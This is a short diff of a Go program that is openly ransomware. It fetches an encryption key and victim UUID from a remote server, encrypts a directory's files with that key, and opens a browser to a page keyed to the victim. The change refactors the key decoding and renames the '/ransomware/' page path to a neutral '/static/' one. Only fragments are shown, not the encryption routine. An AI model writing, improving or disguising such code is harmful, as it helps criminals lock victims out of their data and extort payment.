@@ -110,10 +110,9 @@ func makeRemoteCall() (string, string) {
     }
     defer resp.Body.Close()
 
-    body, _ := ioutil.ReadAll(resp.Body)
-    var key Response
-    json.Unmarshal(body, &key)
-    // Return the uuid and the key
+    key := new(Response)
+    json.NewDecoder(resp.Body).Decode(key)
+
     return key.Uuid, key.Key
 }
 
@@ -142,5 +141,5 @@ func main() {
     // Encrypt directory and its files with the key
     encryptDirectory(dir, key)
     // Open browser with the UUID at the end of the url.
-    openBrowser(base_url + "/ransomware/index.html?uuid=" + uuid_16)
+    openBrowser(base_url + "/static/index.html?uuid=" + uuid_16)
 }
